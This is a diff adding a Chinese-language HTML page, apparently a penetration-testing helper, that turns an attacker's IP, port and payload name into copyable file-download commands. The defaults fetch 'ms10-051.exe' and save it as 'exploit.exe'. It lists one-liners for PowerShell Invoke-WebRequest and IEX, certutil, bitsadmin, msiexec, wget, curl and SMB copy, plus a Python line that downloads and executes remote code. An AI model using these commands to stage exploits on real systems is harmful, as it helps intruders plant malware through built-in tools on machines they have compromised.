@@ -1,0 +1,319 @@
+<!--
+	   原项目：https://github.com/r0eXpeR/File-Download-Generator/
+        修改：Acczdy
+		=======================================
+
+		【协议：】本项目仅供技术交流参考之用，请严格遵守当地法律法规，不要利用本项目中的技术进行违法犯罪操作，一旦触犯法律与Acczdy无关。
+		除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。
+		如有侵权，请联系Acczdy及时删除！
+
+		=======================================
+-->
+<html>
+<!-- 弹窗页面 Start
+  <script>
+	  var result = window.confirm("棱角社区项目：https://github.com/r0eXpeR/File-Download-Generator/\r\n修改：Acczdy\r\n=======================================\r\n【协议：】本项目仅供技术交流参考之用，请严格遵守当地法律法规，不要利用本项目中的技术进行违法犯罪操作，一旦触犯法律与Acczdy无关。\r\n除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束如有侵权，请联系Acczdy及时删除！\r\n=======================================");
+		if (result) {
+		  // 用户点击了确定按钮
+		  // 打开页面
+		} else {
+		  // 用户点击了取消按钮
+		  // 关闭页面
+		  window.close();
+		}
+  
+  </script>
+  弹窗页面 End -->
+<head>
+  <meta charset="utf-8" /> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /> 
+  <title>文件下载命令快捷生成</title> 
+
+  
+  <link href="./css/Passwd.css" rel="stylesheet" /> 
+  <link href="../../static/css/bootstrap.min.css" rel="stylesheet" />
+  <!-- 图标S--> 
+  <link href="../../static/css/materialdesignicons.min.css"  rel="stylesheet" /> 
+  <!-- 图标E-->
+  <!-- 页面顶部CSS S--> 
+  <link href="../../static/css/style.min.css"  rel="stylesheet" /> 
+  <!-- 页面顶部CSS E-->
+ <style type="text/css">
+#wrap {
+    padding-bottom: 10px;
+    min-height: 450px;
+    border: 5px solid #333333;
+    background-color: #FFF;
+    clear: both;
+    width: 95%;
+    margin: 0 auto;
+}
+</style> 
+ </head> 
+ <body>
+<div class="container-fluid p-t-15"> 
+   <div class="row"> 
+    <div class="col-sm-12"> 
+     <div class="card"> 
+	 <!--<div class="card-header bg-primary">-->
+	<div class="card-header bg-info"> 
+       <h3><i class="mdi mdi-windows"></i>&nbsp;文件下载命令快捷生成</h3>
+       <ul class="card-actions"> 
+       </ul> 
+      </div>
+	  </div>
+<div id="wrap" class="wrap s_clear">
+    <div class="main">
+        <div class="content">
+            <script type="text/javascript">
+            var currentMenu = $('mn_') ? $('mn_') : $('mn_index');
+            currentMenu.parentNode.className = 'current';
+            </script>
+            </script>
+            <div class="s_clear">
+                <div class="ywhacknav"></div>
+                <script>
+                    function disableScrolling(){
+    var x=window.scrollX;
+    var y=window.scrollY;
+    window.onscroll=function(){window.scrollTo(x, y);};
+}
+
+function enableScrolling(){
+    window.onscroll=function(){};
+}
+
+function copy(item_id) {
+  disableScrolling();
+  var copyText = document.getElementById(item_id).textContent;
+  const textArea = document.getElementById('txt');
+  textArea.textContent = copyText;
+  textArea.select();
+  document.execCommand("copy");
+  enableScrolling();
+  return false;
+}
+</script>
+                <style type="text/css">
+                    html {
+    margin: 0;
+    padding: 0;
+    height: 100%
+}
+
+body {
+    background: #f4f4f4;
+    font: 12px "Lucida Grande", "Lucida Sans Unicode", Helvetica, Arial, Verdana, sans-serif;
+    font-size: 12px;
+    margin: 0;
+    padding: 0;
+    height: 100%
+}
+
+                button {
+
+                    padding: 0 5px;
+                    margin: 0;
+                }
+
+                textarea {
+                    position: fixed;
+                    left: -100%;
+                }
+
+                pre {
+                    font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
+                    font-size: 12px;
+                    background-color: #f6f8fa;
+                    overflow: auto;
+                    border: 1px solid #898989;
+                    padding: 5px;
+                }
+
+                .main_shell {
+                    max-width: 100%;
+                    margin: auto;
+                    background-color: #fff;
+                    padding: 15px;
+                    border: 1px solid #898989;
+                }
+
+                .main_shell h3 {
+                    padding-top: 15px;
+                    font-size: 16px;
+                }
+
+                .main_bountytips {
+                    max-width: 100%;
+                    margin: auto;
+                    background-color: #fff;
+                }
+
+                .main_bountytips h3 {
+                    padding-top: 15px;
+                    font-size: 16px;
+                }
+
+
+                .tips {
+                    padding-bottom: 15px;
+                    padding-top: 10px;
+                    border-bottom: 1px dashed #999;
+
+                }
+
+                .tips ul {
+                    display: block;
+                    list-style-type: disc;
+                    margin-block-start: 1em;
+                    margin-block-end: 1em;
+                    margin-inline-start: 0px;
+                    margin-inline-end: 0px;
+                    padding-inline-start: 15px;
+                }
+
+                .tips ul li {
+                    display: list-item;
+                    text-align: -webkit-match-parent;
+                    list-style-type: square;
+                }
+
+                .tips .tips_title {
+                    font-size: 14px;
+                    padding-bottom: 10px;
+                }
+
+                .tips blockquote {
+                    padding: 0 15px;
+                    margin: 0;
+                    color: #666;
+                    border-left: 4px solid #ddd;
+                }
+
+                input[type=text] {
+                    border: 1px solid #898989;
+                    font-size: 12px;
+                    width: 140px;
+                }
+                </style>
+                
+               <div class="itemtitle s_clear">
+                <h1 style="padding-left: 15px;">BountyTips - 文件下载命令生成</h1>
+            </div>
+                <div class="main_shell">
+                    地址: <input type="text" id="ip" value="127.0.0.1" name="ip">
+                    端口: <input type="text" id="port" value="8080" name="port">
+                    源文件: <input type="text" id="Source" value="ms10-051.exe" name="Source">
+                    目标文件: <input type="text" id="name" value="exploit.exe" name="name">
+                    <input type="submit" value="修改" onclick="myFunction()">
+                    <input type="reset" value="重置" onclick="myFunction2()">
+                    <script>
+                    function myFunction() {
+                        var ip = document.getElementById("ip").value;
+                        var port = document.getElementById("port").value;
+                        var Source = document.getElementById("Source").value;
+                        var name = document.getElementById("name").value;
+                        console.log(ip);
+                        console.log(port);
+                        console.log(Source);
+                        console.log(name);
+                        var html = document.body.innerHTML;
+                        html = html.replace(/127\.0\.0\.1/g, ip);
+                        html = html.replace(/8080/g, port);
+                        html = html.replace(/ms10-051\.exe/g, Source);
+                        html = html.replace(/exploit\.exe/g, name);
+                        document.body.innerHTML = html;
+                    }
+
+                    function myFunction2() {
+                        location.reload();
+                    }
+                    </script>
+                    <textarea id="txt"></textarea>
+                    <div class="main_bountytips">
+                    <h3>文件下载命令快捷生成:</h3>
+                    <div class="tips">
+                        Python HTTP:
+                        <pre id="cmd001">python -m SimpleHTTPServer 8080</pre>
+                        <button onclick="copy('cmd001')">复制</button>
+                    </div>
+                    <div class="tips">
+                        Python3 HTTP:
+                        <pre id="cmd002">python3 -m http.server 8080</pre>
+                        <button onclick="copy('cmd002')">复制</button>
+                    </div>
+                    <div class="tips">
+                        Python FTP:
+                        <pre id="cmd003">python -m pyftpdlib -p 8080</pre>
+                        <button onclick="copy('cmd003')">复制</button>
+                    </div>
+                    <div class="tips">
+                        Python3 SMB:
+                        <pre id="cmd004">python3 impacket-smbserver.py files . -port 8080</pre>
+                        <button onclick="copy('cmd004')">复制</button>
+                    </div>
+                    <div class="tips">
+                        PowerShell - IWR:
+                        <pre id="cmd005">powershell.exe -Command "Invoke-WebRequest -Uri http://127.0.0.1:8080/ms10-051.exe -OutFile exploit.exe"</pre>
+                        <button onclick="copy('cmd005')">复制</button>
+                    </div>
+                    <div class="tips">
+                        PowerShell - IEX:
+                        <pre id="cmd006">powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:8080/ms10-051.exe', exploit.exe)"</pre>
+                        <button onclick="copy('cmd006')">复制</button>
+                    </div>
+                    <div class="tips">
+                        CMD - Certutil:
+                        <pre id="cmd007">certutil.exe -urlcache -split -f http://127.0.0.1:8080/ms10-051.exe exploit.exe</pre>
+                        <button onclick="copy('cmd007')">复制</button>
+                    </div>
+                    <div class="tips">
+                        CMD - SMB:
+                        <pre id="cmd008">copy \\127.0.0.1\files\ms10-051.exe exploit.exe</pre>
+                        <button onclick="copy('cmd008')">复制</button>
+                    </div>
+                    <div class="tips">
+                        Linux - wget:
+                        <pre id="cmd009">wget http://127.0.0.1:8080/ms10-051.exe -O exploit.exe</pre>
+                        <button onclick="copy('cmd009')">复制</button>
+                    </div>
+                    <div class="tips">
+                        Linux - curl:
+                        <pre id="cmd010">curl http://127.0.0.1:8080/ms10-051.exe -o exploit.exe</pre>
+                        <button onclick="copy('cmd010')">复制</button>
+                    </div>
+                    <div class="tips">
+                        Windows Bitsadmin:
+                        <pre id="cmd011">bitsadmin /rawreturn /transfer down "http://127.0.0.1:8080/ms10-051.exe" c:\\exploit.exe</pre>
+                        <button onclick="copy('cmd011')">复制</button>
+                    </div>
+                    <div class="tips">
+                        Windows msiexec:
+                        <pre id="cmd012">msiexec /q /i http://127.0.0.1:8080/ms10-051.exe</pre>
+                        <button onclick="copy('cmd012')">复制</button>
+                    </div>
+                    <div class="tips">
+                        Python Download:
+                        <pre id="cmd013">python -c "import urllib2; exec urllib2.urlopen('http://127.0.0.1:8080/ms10-051.exe').read();"</pre>
+                        <button onclick="copy('cmd013')">复制</button>
+                    </div>
+                    <div class="tips">
+                        Windows IPC$:
+                        <pre id="cmd014">copy \127.0.0.1\c$\ms10-051.exe C:\exploit.exe</pre>
+                        <button onclick="copy('cmd014')">复制</button>
+                    </div>
+                    <div class="tips">
+                    <!-- <blockquote>
+                        <p>参考File Download Generator：<a href="https://file-downloads.com/" target="_blank">https://file-downloads.com/</a></p>
+                        <p>From：<a href="https://forum.ywhack.com/" target="_blank">Edge Security Team</a></p>
+                    </blockquote> -->
+                </div>
+                </div>
+                </div>
+                <br>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
